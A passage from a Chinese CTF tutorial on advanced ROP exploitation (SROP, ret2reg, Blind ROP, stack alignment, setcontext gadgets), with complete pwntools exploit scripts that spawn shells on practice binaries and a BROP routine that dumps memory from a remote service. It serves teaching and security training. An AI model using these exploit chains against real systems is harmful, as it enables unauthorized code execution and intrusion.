  = 一次 SROP ≈ 一次"寄存器全控"，比 ret2csu 强得多
```

### 7.3.2 触发 SROP 的三要素

| 要素 | 说明 | 常见来源 |
| ---- | ---- | ---- |
| 伪造 frame 在可控内存 | SigreturnFrame ≈ 248 字节（64 位），必须躺在栈上被 read 进来 | 溢出 payload 直接内嵌；或 read 到 bss |
| rax = 15（0xf） | sigreturn 调用号 | `pop rax ; ret`（栈上放 15）；`mov eax, 0xf`；**read 的返回值 = 读入字节数 = 15**（构造读入恰好 15 字节！巧但好用） |
| `syscall` 指令 | 真正发起调用 | `syscall ; ret` gadget；静态程序里海量；动态链接时 libc 里也有 |

执行顺序：返回地址 → `pop rax ; ret`（rax←15）→ `syscall ; ret` → 内核读栈上 frame → 全寄存器恢复 → rip 跳到 frame.rip。

> 32 位注意：调用号是 **119（0x77）**，用 `int 0x80` 触发；frame 布局也完全不同（sigcontext 成员偏移各异）。pwntools 的 `SigreturnFrame(kernel='i386')` 自动处理。

### 7.3.3 pwntools SigreturnFrame 速成

```python
from pwn import *
context.arch = 'amd64'                      # 必须先设 arch，frame 才知道布局

frame = SigreturnFrame(kernel='amd64')      # 64 位内核布局
frame.rax = constants.SYS_execve            # 59：execve
frame.rdi = binsh_addr                      # "/bin/sh" 所在地址
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr                # sigreturn 恢复后跳到这里
frame.rsp = stack_after_addr                # 恢复后的栈指针（getshell 用不上，链式 SROP 关键）
print(len(frame))                           # 248 字节，直接 bytes(frame) 塞进 payload
```

frame 里每个成员就是 sigcontext 的一个字段，pwntools 已按内核结构体偏移对齐，`bytes(frame)` 即可直接当 payload 片段。**frame 自身需要 248 字节栈/内存空间**，小缓冲溢出时要算清。

### 7.3.4 SROP getshell 完整 exp（64 位）

目标（编译 `gcc -fno-stack-protector -no-pie srop.c -o srop`，给 libc 附件亦可按 libc 找 gadget）：

```c
// srop.c —— 一次读 "/bin/sh" 进 bss，一次读溢出链
#include <unistd.h>

char sh[0x10];

int main() {
    char buf[0x10];
    read(0, sh, 0x10);       // 第一笔：写入 "/bin/sh\0"
    read(0, buf, 0x300);     // 第二笔：溢出 0x10，足够容纳链 + frame
    return 0;
}
```

思路：

```text
无输出函数 → 不可 leak libc → 放弃 ret2libc。
静态 gadget 需求极低：只要 pop rax;ret 与 syscall;ret（二进制或 libc 中找）。
frame 一次设置 execve("/bin/sh", 0, 0) 的全部寄存器 → 直接 getshell。
```

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p   = process('./srop')
elf = ELF('./srop')
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')   # gadget 也可从 libc 找

pop_rax_ret = 0x40123C        # pop rax ; ret
syscall_ret = 0x40123E        # syscall ; ret
sh_addr     = elf.symbols['sh']
offset      = 0x10 + 8        # buf + saved rbp

# ---- 第一笔：往 bss 写 "/bin/sh" ----
p.send(b'/bin/sh\x00')

# ---- 第二笔：链 + 伪造 sigcontext ----
frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_execve     # 59
frame.rdi = sh_addr                  # filename
frame.rsi = 0                        # argv
frame.rdx = 0                        # envp
frame.rip = syscall_ret              # 恢复后执行 syscall → execve
frame.rsp = 0xdead0000               # 随意：execve 成功后旧栈作废

rop  = b'A' * offset
rop += p64(pop_rax_ret)              # rax ← 15
rop += p64(15)
rop += p64(syscall_ret)              # 发起 rt_sigreturn：内核按 frame 恢复寄存器
rop += bytes(frame)                  # sigreturn 读栈上这块内存作为 sigcontext
p.send(rop)

p.interactive()                      # execve("/bin/sh",0,0) → shell
```

栈图（第二笔发送后）：

```text
栈（高地址方向）                          内容
┌───────────────────┐
│ 'A'*0x10           │
│ saved rbp（被盖）   │
├───────────────────┤
│ pop_rax_ret        │ ← ret①
│ 15                 │ → rax = 15
│ syscall_ret        │ ← ret②，syscall(rax=15)=rt_sigreturn
│ frame (248字节)     │ ← 内核从这里恢复全部寄存器：
│                    │    rip=syscall_ret → 执行 execve("/bin/sh",0,0)
└───────────────────┘
```

### 7.3.5 SROP 的常见来源场景

- **`alarm`/`sleep` 触发**：程序调用 `alarm(n)` 后我们让它 SIGALRM，若此时栈上有 frame 且能回到 `mov rax,0xf` 类代码（libc 的 restorer 代码 `setcontext` 附近就有），可"被动"触发 SROP。经典：32C3 CTF readme。
- **read 返回值凑 rax=15**：`read(0, buf, 0x18)` 且我们**恰好发 15 字节** → 返回值 rax=15，返回地址直接放 `syscall ; ret`，连 `pop rax` 都省了。构造溢出数据时把"读入长度"当成 gadget 来设计，是 SROP 的经典巧思。
- **与栈迁移联动**：栈空间只有几十字节时，先用 read@plt/csu 把 frame 读到 bss，再迁移到 bss 执行 SROP（**SROP + pivot 是"零 leak 免 libc"题的万能钥匙**）。
- **pwntools 辅助**：`SigreturnFrame(kernel='i386')` 出 32 位 frame；`pwnlib.rop.ret2csu` 之外还有 `find_gadget(['syscall','ret'])` 帮你在 ROP 对象里找 syscall。

### 7.3.6 SROP 执行 orw 概述（联动链 11）

沙箱禁 execve 时，SROP 照样能打 orw——frame 本质是"一次设置全部寄存器"，那就是"一次发起任意 syscall"：

```text
frame1: rax=2(open),  rdi=flag路径, rsi=0,      rip=syscall_ret, rsp=frame2落地处
        → syscall 返回后 rip 处再放 "pop rax;syscall" 走 frame2？不——
frame 的 rsp 指向"下一次 SROP 的触发链"（pop rax;ret;syscall;ret + frame2），
open 返回后从 frame.rsp 接着跑第二轮 SROP：frame2: rax=0(read) rdi=3 rsi=buf rdx=0x100
frame3: rax=1(write) rdi=1 rsi=buf rdx=0x100 → 打印 flag
```

每个 frame 的 `rsp` 指向下一个 SROP 的触发代码与 frame，形成 **SROP 链**。详细 orw 布局与边界处理（fd=3、路径字符串存放）见 [11-ORW与沙箱绕过.md](11-ORW与沙箱绕过.md) 第 11.x 节"纯 SROP 链"。相比 ROP 链式 orw，SROP 链每一步消耗 248 字节 + 24 字节触发器，胜在**完全不需要任何传参 gadget**。

### 7.3.7 SROP 常见坑速记（详表见 7.10）

- `context.arch` 忘设 amd64 → frame 布局错乱，SIGSEGV 在恢复现场时。
- frame 必须放在**触发 syscall 时 rsp 能指向的位置**（通常紧跟触发器后面；迁移场景注意 frame 与触发器都要在迁移后的区域）。
- frame.rsp 决定 rt_sigreturn 之后的栈，**链式 SROP 必须显式设置**，否则rsp 是垃圾值。
- 32 位调用号是 119 不是 15。

---

## 7.4 ret2reg：call rax / jmp rdx 等寄存器间接 gadget

### 7.4.1 思想

ROP 常规思路是"控制寄存器 → 跳固定地址"，ret2reg 反过来：**程序运行到崩溃点/返回点时，某个寄存器恰好已经指向我们的可控数据**（缓冲区、bss、堆块），那么一条 `call rax` / `jmp rdx` / `call qword ptr [rax+0x10]` 就是现成的跳板——不用再往寄存器里"搬"地址。

### 7.4.2 什么情况下寄存器会"恰好"指向可控数据

| 场景 | 寄存器 | 说明 |
| ---- | ---- | ---- |
| `read(0, buf, n)` / `fgets(buf,...)` 刚返回 | rax | 返回值是**读入字节数**；配合 7.2.6 的 `xchg eax, esp` 可迁移 |
| 函数内 `memcpy(dst, src, n)`、`strcpy` 后 | rdi/rsi | 可能残留 dst/src 指针 |
| 自定义函数 `void f(char *p)` 溢出后寄存器未清 | rdi | p 就是可控缓冲区 |
| C++ 对象方法调用 | rdi | this 指针指向堆对象（可伪造虚表） |
| 堆题 free 后 | rdi | 常指向被 free 的 chunk（可写） |

### 7.4.3 利用流程

1. **观察**：gdb 在溢出触发时（或 ret 执行前）`info registers`，找"值落在可控数据区"的寄存器；
2. **搜跳板**：`ROPgadget --binary ./pwn | grep -E "call (rax|rbx|rdx|rsi|rdi)"`、`grep -E "jmp (rax|rdx)"`、`call qword ptr [rax]`；
3. **布局**：让可控区起始处正好是下一跳内容——若跳板是 `call rax`，可控区开头应放**函数地址或第一条 gadget**（取决于 call 后语义）；若是 `jmp rax`，开头直接是代码/gadget 地址；
4. **拼接**：返回地址（或上级 gadget）→ call rax 跳板 → 落在可控区里的 ROP 链。

### 7.4.4 例：rax 指向 bss 的 read 链

```python
# 设程序存在 read(0, bss_buf, 0x100) 且 read 返回后紧接 ret，
# rax = 0x100（不是地址，别误用）；真正的机会是某些自定义输入函数：
#   char *get_input() { read(0, g_buf, 0x100); return g_buf; }  → rax = g_buf
# 此时返回地址填 call_rax_gadget，g_buf 开头放 ROP 链：
rop_on_bss = p64(pop_rdi_ret) + p64(binsh) + p64(system)
payload    = rop_on_bss          # 第一笔输入写入 g_buf
p.send(payload)
p.send(b'A'*offset + p64(call_rax_ret))   # 第二笔：call rax → g_buf 开头
```

**变体**：`call qword ptr [rax + k]`（可控区第 k 字节处放目标函数）；`jmp [reg]` 双重间接。这些 gadget 在 C++ 程序、带函数指针表的程序里密度很高。

**常见坑**：`call rax` 会把返回地址压栈——跳过去的 gadget 若最后 `ret`，会回到 `call` 的下一条指令，注意栈顶衔接；`jmp rax` 无此问题但不可回落。ret2reg 更多是"赛场灵感"而非通用解法：先搜常见 gadget 失败后，再回头翻寄存器。

---

## 7.5 BROP 概念详解：无二进制的远程盲打

### 7.5.1 BROP 是什么，什么时候用

**BROP（Blind ROP）**：在没有二进制文件、没有 libc、只有一个"连上去就让你溢出"的远程服务时，纯靠**探测输入与观察行为差异**（正常返回 / 崩溃断连 / 挂起）把 ROP 拼出来。

适用判据（全部满足才有得打）：

1. 远程在 crash 后能**自动重启**（fork server / xinetd / socat），且不会因频繁连接被封禁；
2. 栈溢出长度足够覆盖返回地址 + 若干槽；
3. 能区分"崩溃"与"存活"——最简单：发完 payload 后 `recv` 是否断连；最好还能区分"存活但 hang"（stop gadget 的意义）；
4. 有基本常识假设：64 位、非 PIE（老题）或已知大致编译环境。

### 7.5.2 攻击模型与流程图

```text
① 探溢出偏移：逐字节加长 payload，观察何时"必崩"
      │
      ▼
② 找 stop gadget：一个"跳过去不崩但挂住"的地址
      │      （程序里任何阻塞调用/死循环都行，最典型是 read）
      ▼
③ 暴力扫描代码段找 brop gadget（= __libc_csu_init 的 6 连 pop）
      │      差分法：候选地址 + 16 字节垃圾 + stop_gadget
      │      6 连 pop 会吃掉 48 字节垃圾后 ret 到 stop_gadget → 挂住（不崩）
      │      普通 gadget 吃不满 → ret 落进垃圾 → 崩
      ▼
④ 由 brop gadget 推出传参 gadget：brop_gadget + 7 = "pop rsi ; pop r15 ; ret"
      │      再在附近扫描确认 "pop rdi ; ret"（csu 字节重叠，常在 gadget1-2 处）
      ▼
⑤ 在 PLT 区找"输出函数"（puts/write）：逐个候选 PLT 地址调用
      │      调用后有数据回传 → 候选就是输出函数
      ▼
⑥ 用输出函数 dump 整个二进制（每次 puts 一个地址，遇 \0 截断则换起点多次拼）
      │      重建 binary → 本地 IDA/ROPgadget 分析 → 补齐所需 gadget
      ▼
⑦ puts(puts@got) 泄露 libc → 本地比对/识别版本 → system("/bin/sh") getshell
```

### 7.5.3 stop gadget：把"有效地址"挑出来

给返回地址填一个**候选地址**后发送，结果分三类：

```text
A. 连接立刻断（SIGSEGV/SIGPIPE）   → 候选不是有效代码，或有效但马上崩
B. 程序正常退出（连接关闭但优雅）    → 有效但走完了 main
C. 连接一直挂着（recv 超时无 EOF）   → ★ 候选很可能是"stop gadget"
```

stop gadget 的意义：它是**对照物**。后续扫描 brop gadget 时，"崩了"和"挂住了"两种结果的差分，才能确定 gadget 吃掉几个栈槽。

实现上，程序里任何 `read`/`accept`/`sleep`/死循环都是天生的 stop gadget——这也是为什么 BROP 场景的服务器（大多 `read` 用户输入）特别适合被打。

### 7.5.4 找 brop gadget：差分扫描

代码段按 8/16 字节对齐逐地址试，对每个候选 G 发：

```text
payload = 'A'*offset + p64(G) + b'B'*16 + p64(stop_gadget)
```

判定逻辑：

- 若 G 是 **brop gadget（`pop rbx,rbp,r12,r13,r14,r15 ; ret`）**：6 连 pop 吃掉 48 字节 B，ret 取第 7 槽=stop_gadget → **挂住（存活）**；
- 若 G 是普通单 pop gadget：吃 8 字节后 ret 到垃圾 'B'*8 → 崩；
- 若 G 是 add rsp,N 类：跳过 N 字节后落在垃圾或 stop_gadget，视 N 而定。

再用**变化垃圾长度**做二次确认（垃圾从 16 加到 24 时，"挂住"的集合应只有 6 pop gadget 保持稳定）——差分出"恰好 pop 6 次"的候选，基本就是 csu。误报（比如跳到别的 stop gadget 链）可以通过后续"调用行为"验证排除。

### 7.5.5 从 brop gadget 到传参 gadget

csu gadget1 的字节 `5b 5d 41 5c 41 5d 41 5e 41 5f c3` 存在**字节重叠**：

```text
G + 7 :  5e 41 5f c3  →  pop rsi ; pop r15 ; ret     ★ 白捡两个传参 gadget
G + 9 :  41 5f c3    →  pop r15 ; ret
G - 2 :  （紧邻 gadget1 前的字节若为 5f c3）→ pop rdi ; ret
```

于是 rsi、（大概率）rdi 都有了；没有 rdx 也能靠 csu 的 gadget2 思想（远程上先按形态 A 假设，用"调用输出函数是否带出正确数据"验证）。**找 pop rdi 的稳妥法**：dump 出二进制后本地搜（见 7.5.6）。

### 7.5.6 找输出函数并 dump 内存

PLT 区按 16 字节对齐（`0x400560` 起每项 `jmp [got]` 6 字节 + padding），逐项尝试：

```text
payload = 'A'*offset + p64(pop_rdi_ret) + p64(任意 GOT 表项地址)
        + p64(候选PLT) + p64(stop_gadget)
→ 若连接回传了一段可读数据：候选 = puts（puts 会打印 GOT 处字符串）
→ write 更友好（参数多），先用 csu/已知 gadget 凑 write(4, addr, len) 亦可
```

定位到 puts 后，用它 dump 代码段：

```python
def dump(addr):
    p = remote(ip, port)
    p.send(b'A'*offset + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt)
           + p64(stop_gadget))          # stop_gadget 让程序别急着退出
    data = p.recvuntil(b'\n', timeout=1)[:-1]   # puts 自己会加 \n，去掉
    p.close()
    return b'\x00' if data == b'' else data   # puts 打印空串 → 该地址是 \0

# 从 0x400000 开始按页 dump；遇到 \0 截断就从 addr+1 重试，多次拼接
```

把 dump 出来的内存按地址拼回 ELF（至少 .text/.plt/.got/.rodata），本地 `ROPgadget --binary dumped.so` 补齐 `pop rdi` 等。**注意**：dump 时 puts 遇 `\0` 截断是最大噪声源，要按"每地址一次、空则记 \0"逐字节重建关键区域。

### 7.5.7 leak libc 与 getshell

```text
puts(puts@got)  →  得到 libc 中 puts 的真实地址
本地 Enumerate：匹配 libc-database / LibcSearcher（低 12 位不变，见 05 章）
第二轮：pop rdi ; ret + "/bin/sh" + system → getshell
```

如果 dump 里能拿到 puts@got 与 PLT，后面与普通 ret2libc 完全一致（05 章）。

### 7.5.8 BROP 本地模拟演示

见 7.9 例题 4：本地起一个"知情"服务，但攻击脚本**只允许通过 socket 交互**，完整走一遍 ①~⑦ 流程。

---

## 7.6 栈对齐问题专题：movaps SIGSEGV

### 7.6.1 成因：System V 的 16 字节对齐要求

System V AMD64 ABI 规定：**`call` 指令执行前 rsp 必须满足 16 字节对齐（rsp % 16 == 0）**。call 会压 8 字节返回地址，所以进入被调函数第一条指令时 `rsp % 16 == 8`，函数开头 `push rbp` 后又回到 16 对齐。

现代 libc 里的 `system` / `printf` 内部使用 SSE 指令 `movaps xmm0, [rsp+X]`，**要求操作地址 16 字节对齐**。如果通过 ROP "跳进" system 时 rsp 对不齐，函数内部某条 movaps 就会 SIGSEGV——程序明明走到了 system 却崩在深处，这是赛场最著名的"隐形杀手"。

```text
正常调用链（对齐 ✓）                       ROP 直跳（可能 ✗）
main: rsp%16==0                           链上槽位数任意 → 进入 system 时
call system: 压返回地址                    rsp%16 可能为 0（而非约定的 8）
system 入口: rsp%16==8                     → 内部 movaps 地址错 8 字节
push rbp:    rsp%16==0 ✓                   → SIGSEGV
movaps [rsp+0x50], xmm0 ✓
```

**判定口诀**：数一数从"返回地址槽"到"system 地址槽"之间隔了多少个 8 字节槽——若 `system` 入口处等效 rsp%16 == 0（错位了），就会崩。更快的方法是 gdb 直接看：crash 时 `p $rsp & 0xf`，若 `system+X` 的 movaps 报错且 rsp%16 == 0，就是对齐问题。

### 7.6.2 检测方法

```bash
# 1. dmesg 里看崩溃点指令
$ sudo dmesg | tail
traps: pwn[123] general protection ip:7f... sp:7ffd... error:0 in libc.so.6
# ip 落在 libc 内 + gdb 断到 SIGSEGV 时看汇编是 movaps → 基本确诊

# 2. gdb 现场确认
gdb> catch signal SIGSEGV
gdb> x/i $rip          # movaps ...
gdb> p/x $rsp & 0xf    # 若为 0（而此处应为 8）→ 错位 8 字节
```

### 7.6.3 三种修复

1. **垫一个 `ret` gadget**（最常用）：在 `pop rdi` 前后加一条纯 `ret`，把整个链往后推 8 字节，等效改变 system 入口时的 rsp 对齐：

```python
payload = b'A'*offset
payload += p64(ret_gadget)     # ★ 垫一条 ret：链整体 +8 字节，翻转对齐
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)
```

2. **换等价 gadget**：把 `pop rdi ; ret` 换成 `pop rdi ; pop rsi ; ret` 之类**多弹一个槽**的变体（记得补一个填充值），或调整 csu 的收尾垫槽数量——本质同样是移动 8 字节。

3. **调整 payload 长度**：若溢出填充长度可浮动（如 `fgets` 少读 8 字节无影响），直接在 padding 末尾多/少 8 字节。**one_gadget 同样受此影响**：one_gadget 不响时，第一反应就是垫/撤一条 ret。

> 32 位为什么没有这个问题？32 位 cdecl 对栈对齐没有 16 字节硬要求（SSE 按需对齐由编译器保证），movaps 崩溃几乎只出现在 64 位。这是"32 位模板是否适用"章节说明里的固定答案。

### 7.6.4 原理图（一次对齐修复的前后对比）

```text
修复前（崩）：                          修复后（垫 ret，✓）：
  低地址                                     低地址
  ┌─────────────┐                         ┌─────────────┐
  │ pop_rdi_ret │                         │ ret         │
  ├─────────────┤                         ├─────────────┤
  │ binsh       │                         │ pop_rdi_ret │
  ├─────────────┤                         ├─────────────┤
  │ system      │ ← rsp%16==0 ✗           │ binsh       │
  └─────────────┘                         ├─────────────┤
                                          │ system      │ ← rsp%16==8 ✓
                                          └─────────────┘
  高地址                                     高地址
```

经验：**写好 exp 先本地跑通，远程再崩且崩在 libc 深处 → 第一时间试垫 ret**。

---

## 7.7 setcontext 系 gadget（setcontext+53 / setcontext+61）

### 7.7.1 原理：从一块内存批量恢复寄存器

libc 的 `setcontext(const ucontext_t *ucp)` 本用于保存/恢复线程上下文，函数开头有一段"从 ucp 指向的内存恢复全部通用寄存器"的代码。**攻击者只要控制 rdi 指向一块伪造的 ucontext 内存，跳进这段代码，就能一次性设置 rsp、rip、rdi、rsi、rdx、rax……** 效果与 SROP 等价，但**不需要 syscall、不需要 rax=15**，动态链接堆题里极其常用。

64 位 `ucontext_t` 的关键布局（pwntools 无现成封装，需手写偏移）：

```text
ucontext_t:
  +0x00  uc_flags
  +0x08  uc_link
  +0x10  uc_stack (24 字节)
  +0x28  mcontext.gregs:   ← 从这里起是寄存器数组
  +0x28  r8      +0x30  r9      +0x38  r10     +0x40  r11
  +0x48  r12     +0x50  r13     +0x58  r14     +0x60  r15
  +0x68  rdi     +0x70  rsi     +0x78  rbp     +0x80  rbx
  +0x88  rdx     +0x90  rax     +0x98  rcx
  +0xa0  rsp     ★     +0xa8  rip     ★
```

### 7.7.2 setcontext+53（glibc < 2.29，基址寄存器 rdi）

glibc 2.29 之前，恢复代码以 **rdi** 为基址：

```asm
setcontext+53:
    mov    rsp, QWORD PTR [rdi+0xa0]   ; ★ 切栈
    mov    rbx, QWORD PTR [rdi+0x80]
    mov    rbp, QWORD PTR [rdi+0x78]
    mov    r12, QWORD PTR [rdi+0x48]
    mov    r13, QWORD PTR [rdi+0x50]
    mov    r14, QWORD PTR [rdi+0x58]
    mov    r15, QWORD PTR [rdi+0x60]
    mov    rcx, QWORD PTR [rdi+0xa8]
    push   rcx                          ; rip 压栈
    mov    rsi, QWORD PTR [rdi+0x70]
    mov    rdi, QWORD PTR [rdi+0x68]    ; ★ 注意：这里才覆盖 rdi
    mov    rcx, QWORD PTR [rdi+0x98]
    mov    r8,  QWORD PTR [rdi+0x28]
    ...
    ret                                 ; 返回到压入的 rip
```

**用法三步**：① 把伪造 ucontext 写到已知地址 U（read@plt / 堆写入 / 溢出区）；② `pop rdi ; ret` 把 rdi 设为 U；③ 返回地址填 `setcontext+53`（在 libc 里，需先 leak libc；静态程序直接搜）。一个 pwntools 构造模板：

```python
def fake_ucontext(rip, rsp, rdi=0, rsi=0, rdx=0, rax=0, rbp=0):
    """按 64 位 ucontext_t 偏移拼一块假上下文（供 setcontext+53 消费）"""
    return flat({
        0x28: 0,            # r8
        0x48: 0,            # r12
        0x68: rdi,          # rdi
        0x70: rsi,          # rsi
        0x78: rbp,          # rbp
        0x80: 0,            # rbx
        0x88: rdx,          # rdx
        0x90: rax,          # rax
        0xa0: rsp,          # ★ 新栈顶
        0xa8: rip,          # ★ 下一条执行的指令
    }, filler=b'\x00', length=0x100)
```

### 7.7.3 setcontext+61（glibc ≥ 2.29，基址寄存器改为 rdx）

CVE-2018-15664 系列修复后，恢复代码改为**以 rdx 为基址**（rdi 留给信号处理），偏移整体 +8（`mov rsp,[rdx+0xa0]` 等，即原来 +53 变 +61）：

```asm
setcontext+61:
    mov    rsp, QWORD PTR [rdx+0xa0]
    mov    rbx, QWORD PTR [rdx+0x80]
    ...
    push   QWORD PTR [rdx+0xa8]
    ...
    ret
```

**触发条件随之变化**：需要先控制 rdx 指向伪造 ucontext。常用手段：

- `pop rdx ; ret` / `mov rdx, r??` gadget（libc 里多得是）；
- **csu gadget2**：`mov rdx, r13` 顺便把 rdx 设好，再跳 setcontext+61；
- 堆题中 free 后 rdx 常残留指向可控堆块（用 gdb 确认后"顺水推舟"）。

版本识别：`libc.so.6` 的版本字符串（strings | grep "GNU C Library"）或直接看 `setcontext` 偏移处反汇编是 `mov rsp,[rdi+0xa0]` 还是 `mov rsp,[rdx+0xa0]`。

### 7.7.4 与堆题配合：free_hook + setcontext 组合拳（联动链 10）

堆题没有"返回地址"可覆盖时，setcontext 是把"一次任意写"放大成"全寄存器控制"的标准放大器：

```text
① glibc < 2.34：__free_hook 写成 setcontext+53
② free(伪造堆块) → 跳 setcontext+53，而 rdi 恰好 = 被 free 的堆块地址！
   → 伪造 ucontext 直接写在那个堆块里 → 一步完成"换栈 + 设置全部寄存器 + 跳 orw"
```

这是 **"__free_hook = setcontext+53 + free(chunk)"** 的免 gadget 三连，rdi 自动指向堆块，连 `pop rdi` 都不用找。堆上伪栈摆放 orw 链见 [10-堆漏洞全解.md](10-堆漏洞全解.md) 与 [11-ORW与沙箱绕过.md](11-ORW与沙箱绕过.md)。

### 7.7.5 mprotect + setcontext 组合（orw 的替代路线）

沙箱没禁 mprotect 时，可以"解锁内存可执行 + setcontext 直接跳 shellcode"，比 orw 链更短：

```text
阶段1（普通 ROP/csu 调用）：mprotect(BSS_PAGE, 0x1000, PROT_READ|WRITE|EXEC=7)
阶段2：read(0, BSS_CODE, 0x100)  ← shellcode 读进可执行区
阶段3：setcontext：rip=BSS_CODE, rsp=BSS_CODE+0x200 → 执行 shellcode（orw 或 execve 均可）
```

pwntools 示意（64 位，libc 版本 < 2.29 用 +53）：

```python
# 阶段1+2 用 ret2csu / ret2libc 完成（见 7.1、05 章），假设已 leak libc
sc  = asm(shellcraft.cat('flag'))            # 或 shellcraft.orw()
# 阶段3：pop rdi 指向 bss 上的假 ucontext，然后 setcontext+53
uc  = fake_ucontext(rip=code_addr, rsp=code_addr + 0x200)
rop  = p64(pop_rdi_ret) + p64(uc_addr) + p64(libc.sym['setcontext'] + 53)
```

### 7.7.6 setcontext 常见坑（速记）

- **rdi 基址在切栈之后才被覆盖**（+53 代码里 `mov rdi,[rdi+0x68]` 发生在 `mov rsp,[rdi+0xa0]` 之后），所以伪 ucontext 所在内存必须**在切栈前一直有效**——堆题里注意别把 ucontext 所在 chunk 提前 free/改写。
- +53 与 +61 别背错：**glibc 2.29 分界，rdi → rdx**；混淆会导致"看似设置正确却崩溃"。
- ucontext 偏移（0xa0/0xa8）与 SROP sigcontext 偏移**不同**，两套结构体不能混用（SROP 用 pwntools SigreturnFrame，setcontext 用上面的 fake_ucontext）。
- setcontext 需 libc 地址 → 动态链接题必须先 leak；静态题直接在二进制里搜 setcontext 符号。

---

## 7.8 无可用 gadget 的综合应对策略表

赛场实战时对照自查——"缺什么"与"去哪找"：

| 缺什么 / 卡在哪 | 首选对策 | 次选对策 | 相关小节 |
| ---- | ---- | ---- | ---- |
| 缺 `pop rdi` | csu gadget1 ±2 字节重叠处；libc 中搜 | `__libc_csu_init` 区域字节错位 gadget | 7.1.7、7.5.5 |
| 缺 `pop rdx`（64 位第一大难题） | **ret2csu** gadget2（mov rdx,r13/r15） | libc 里搜（动态链接必备 libc 附件）；setcontext 一步到位 | 7.1、7.7 |
| 缺 `syscall` 指令 | 动态链接：leak 后从 libc 取 `syscall ; ret` | 静态：二进制内海量；int 0x80 仅 32 位 | 05、04 |
| 缺 rax 控制（打 syscall/SROP） | `pop rax ; ret`；`mov eax,0xf` | **read 返回值凑 rax**（读入字节数=调用号） | 7.3.5 |
| 栈长度不够放长链 | **栈迁移** leave;ret / pop ebp+leave;ret | add rsp,N 滑动；xchg eax,esp；one_gadget 缩链 | 7.2 |
| 没有 `__libc_csu_init`（glibc≥2.34） | leak libc 后全程用 libc gadget | `_init`/`__libc_start_call_main` 附近；SROP/setcontext 兜底 | 7.1.8 |
| 无输出函数无法 leak | csu 调 write/puts（指针表=GOT） | BROP 思路盲打；ret2dlresolve（06 章） | 7.1、7.5、06 |
| 沙箱禁 execve | SROP orw / setcontext orw | mprotect+shellcode；open+sendfile | 11、7.3、7.7 |
| 32 位凑不齐 ebx/ecx/edx | 32 位参数在栈上，不需要寄存器 gadget——直接栈上摆参 | -- | 04 |
| movaps 崩在 libc 深处 | 垫一条 `ret` 翻转对齐 | 换多弹一个槽的等价 gadget | 7.6 |

一句话总结优先级：**能 leak 就先 leak（libc 是最大的 gadget 仓库）→ 缺参数寄存器找 csu/setcontext → 缺空间找 pivot → 全都没有就 SROP/BROP**。

---

## 7.9 典型例题

四道例题对应四条主线：csu 泄露、leave;ret 迁移、SROP getshell、BROP 盲打。每道都给伪 C、checksec、思路与完整 exp，建议全部亲手复现一遍。

### 例题 1：ret2csu 泄露 libc（只有 read 的 64 位程序）

**伪 C**：

```c
// t1.c —— gcc -m64 -fno-stack-protector -no-pie t1.c -o t1
#include <unistd.h>

int main() {
    char buf[0x60];
    read(0, buf, 0x100);     // 溢出 0xa0 字节：足够摆 csu 长链
    return 0;                // 无输出函数可直接调用；有 __libc_csu_init
}
```

**checksec**：

```bash
$ checksec t1
[*] 't1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ readelf -s t1 | grep -i csu     # 确认 ret2csu 前提
44: 0000000000400726  101 FUNC GLOBAL DEFAULT  13 __libc_csu_init
```

**思路**：

```text
① 无任何输出原语、无 pop rdx → ret2csu：gadget2 调 puts(puts@got) 打印 GOT 内容
② 链尾回 main，第二轮用普通 pop rdi + system("/bin/sh")（csu 的 edi 只能 32 位，
   调不了 libc 高地址的 system，见 7.1.7）
③ 64 位注意 7.6：第二轮给 system 前垫一条 ret 翻转对齐
```

**完整 exp**：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p    = process('./t1')
elf  = ELF('./t1')
libc = ELF('./libc.so.6')            # 远程附件；本地按实际路径

# ROPgadget --binary t1 定位（Ubuntu 16.04 形态 A；换环境务必重查）
csu_pop = 0x40072A   # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
csu_call= 0x400710   # mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]
                     # ... add rsp,8 ; pop rbx,rbp,r12,r13,r14,r15 ; ret
pop_rdi = 0x400733   # pop rdi ; ret（csu 区字节重叠处，见 7.1.7 第 4 条）
ret_g   = 0x40055A   # ret，垫对齐

offset   = 0x60 + 8
puts_got = elf.got['puts']
main_addr= elf.symbols['main']

# ---- 第一轮：csu 调 puts(puts_got) ----
rop1  = b'A' * offset
rop1 += p64(csu_pop)
rop1 += p64(0)            # rbx=0 → call [r12+0]
rop1 += p64(1)            # rbp=1 → 一轮后退出循环
rop1 += p64(puts_got)     # r12 → 指针表 = puts@got
rop1 += p64(0)            # r13 → rdx
rop1 += p64(0)            # r14 → rsi
rop1 += p64(puts_got)     # r15 → edi（puts 实参：打印 GOT）
rop1 += p64(csu_call)
rop1 += p64(0) * 7        # 收尾 7 槽
rop1 += p64(main_addr)    # 回 main 打第二轮
p.sendlineafter(b'> ', rop1)         # 按题目提示符调整

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
success(f'libc base = {hex(libc.address)}')

# ---- 第二轮：ret2libc ----
binsh = next(libc.search(b'/bin/sh\x00'))
rop2  = b'A' * offset
rop2 += p64(ret_g)        # ★ movaps 对齐垫片（7.6）
rop2 += p64(pop_rdi) + p64(binsh)
rop2 += p64(libc.sym['system'])
p.sendlineafter(b'> ', rop2)

p.interactive()
```

**变体**：
- 程序连 puts@plt 都没有 → csu 调 `write@plt`：`csu_call(r12=write_got, rdx=8, rsi=write_got, edi=1)`（形态 A 填法：r13=8, r14=write_got, r15=1）；
- 一轮 csu 连调多个函数：rbp 设 n，r12 指向"函数指针表"（如连续排布的多个 GOT 表项），循环自动逐项调用；
- 泄露目标换成 `read@got`/`__libc_start_main+xx`，原理一致。

### 例题 2：leave;ret 迁移到 bss（溢出只有 0x20 的 64 位程序）

**伪 C**：

```c
// t2.c —— gcc -m64 -fno-stack-protector -no-pie t2.c -o t2
#include <unistd.h>

char blob[0x400];            // .bss 大缓冲

int main() {
    char buf[0x10];
